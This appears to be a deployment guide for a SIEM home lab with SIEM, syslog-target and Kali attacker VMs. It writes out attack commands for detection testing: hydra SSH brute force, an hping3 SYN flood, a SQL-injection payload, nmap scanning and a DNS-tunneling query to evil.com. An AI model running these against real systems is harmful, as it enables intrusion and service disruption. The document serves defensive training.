# SOC SIEM PRO — Virtual Machine Deployment Guide

This guide covers deploying the full lab across three virtual machines:

| VM | Role | OS Recommendation |
|---|---|---|
| **SIEM VM** | Runs SOC SIEM PRO (listener, API, GUI) | Ubuntu 22.04 / Windows 11 |
| **Target VM** | Sends real syslog traffic, simulates a production host | Ubuntu 22.04 |
| **Attacker VM** | Launches attacks against the Target VM | Kali Linux |

---

## Network Setup

All three VMs must be on the same virtual network so they can reach each other.

**Recommended:** Use **Host-Only** or **Internal Network** adapter in VirtualBox / VMware.
Bridged also works if you want internet access alongside.

Assign static IPs (example):

| VM | IP |
|---|---|
| SIEM VM | `192.168.56.10` |
| Target VM | `192.168.56.20` |
| Attacker VM | `192.168.56.30` |

---

## VM 1 — SIEM VM (SOC SIEM PRO)

### Install Dependencies

```bash
# Python 3.11+
sudo apt update && sudo apt install -y python3 python3-pip git

# Clone the repo
git clone https://github.com/Rvcem/SOC_SIEM_PRO.git
cd SOC_SIEM_PRO

# Install Python packages
pip install -r requirements.txt
```

### Install Ollama

```bash
curl -fsSL https://ollama.com/install.sh | sh
ollama serve &
ollama pull deepseek:latest
```

### Configure Environment

```bash
cp .env.example .env
nano .env
```

Set at minimum:

```env
OLLAMA_URL=http://127.0.0.1:11434
OLLAMA_MODEL=deepseek:latest
SOC_REPORT_MODEL=deepseek:latest
SOC_ENABLE_REPORTS=1
```

Add your API keys for VirusTotal, AbuseIPDB, etc. if you have them.

### Open Firewall Port

The SIEM listens on UDP port 5555. Allow inbound traffic from the Target VM:

```bash
sudo ufw allow 5555/udp
```

### Start the SIEM

```bash
ollama serve &
python start.py
```

The login screen appears. On first run the one-time admin password prints to the console.

---

## VM 2 — Target VM (Syslog Source)

This VM represents a real server on your network. It forwards its logs to the SIEM VM over UDP port 5555.

### Option A — rsyslog (Linux standard)

Install rsyslog if not present:

```bash
sudo apt install -y rsyslog
```

Add a forwarding rule to `/etc/rsyslog.conf`:

```
*.* @192.168.56.10:5555
```

Restart rsyslog:

```bash
sudo systemctl restart rsyslog
```

All syslog events (SSH attempts, sudo, cron, auth) will now stream to the SIEM.

### Option B — netcat one-liner (quick test)

Send a single test log without any configuration:

```bash
echo "Failed password for root from 192.168.56.30 port 22 ssh2" | nc -u 192.168.56.10 5555
```

### Option C — Custom Python forwarder

```python
import socket, time

SIEM_IP   = "192.168.56.10"
SIEM_PORT = 5555

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
logs = [
    "Failed password for root from 192.168.56.30 port 22 ssh2",
    "Accepted password for admin from 192.168.56.30 port 443",
    "sudo: authentication failure for user www-data",
]
for log in logs:
    sock.sendto(log.encode(), (SIEM_IP, SIEM_PORT))
    print(f"Sent: {log}")
    time.sleep(1)
```

---

## VM 3 — Attacker VM (Kali Linux)

This VM launches real attacks against the Target VM. The Target VM's syslog forwards the resulting log entries to the SIEM VM, where they appear as detected incidents.

### Brute Force SSH

```bash
# hydra brute-force against Target VM SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20
```

The Target VM logs failed SSH attempts → rsyslog forwards to SIEM → SIEM detects brute force.

### Port Scan

```bash
nmap -sS -A -T4 192.168.56.20
```

### DDoS Simulation

```bash
hping3 -S --flood -V 192.168.56.20
```

### SQL Injection Simulation (web app needed on Target)

If the Target VM runs a web server, send payloads:

```bash
curl "http://192.168.56.20/login?user=admin'OR'1'='1"
```

### DNS Tunneling Simulation

```bash
# iodine or dnscat2 generating high-volume DNS queries
nslookup aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.com 192.168.56.20
```

---

## Traffic Flow

```
Attacker VM (Kali)
  192.168.56.30
       │
       │  SSH brute force, nmap, hping3, SQLi
       ▼
Target VM (Ubuntu)
  192.168.56.20
       │
       │  rsyslog UDP → port 5555
       ▼
SIEM VM (SOC SIEM PRO)
  192.168.56.10
       │
       ├── signature detection
       ├── ML anomaly scoring
       ├── behavioral analytics
       ├── Ollama AI reports (deepseek)
       └── PyQt6 dashboard (alerts, blocklist, rule engine)
```

---

## Verifying the Setup

1. On the **SIEM VM**, start the app: `python start.py`
2. On the **Target VM**, trigger a test log:
   ```bash
   logger "Failed password for root from 192.168.56.30 port 22 ssh2"
   ```
3. In the **SIEM dashboard**, check the **Live Alerts** tab — the incident should appear within 1 second.
4. Launch an actual attack from the **Attacker VM** and watch detections come in live.

---

## Sending Simulated Attacks Without a Real Attacker VM

If you only have the SIEM VM, you can simulate attacks locally using the bundled script:

```bash
python test_siem.py
```

This sends a full set of attack payloads (brute force, port scan, SQL injection, DDoS, C2 beaconing, DNS tunneling, malware hashes) to `127.0.0.1:5555`.

---

## Tips

- **GUI requires a display.** On a headless server, either use X11 forwarding (`ssh -X`) or run only `siem_listener.py` and `backend/api.py` and access the Flask API remotely.
- **Ollama is optional.** If the SIEM VM has limited RAM, set `SOC_ENABLE_REPORTS=0` in `.env` to disable AI report generation. All other detection layers still work.
- **SQLite is single-file.** The database `incidents.db` lives in the project root. Back it up with `cp incidents.db incidents.db.bak` before wiping or resetting.
- **UDP is connectionless.** If logs aren't arriving, verify with `tcpdump -i any udp port 5555` on the SIEM VM.
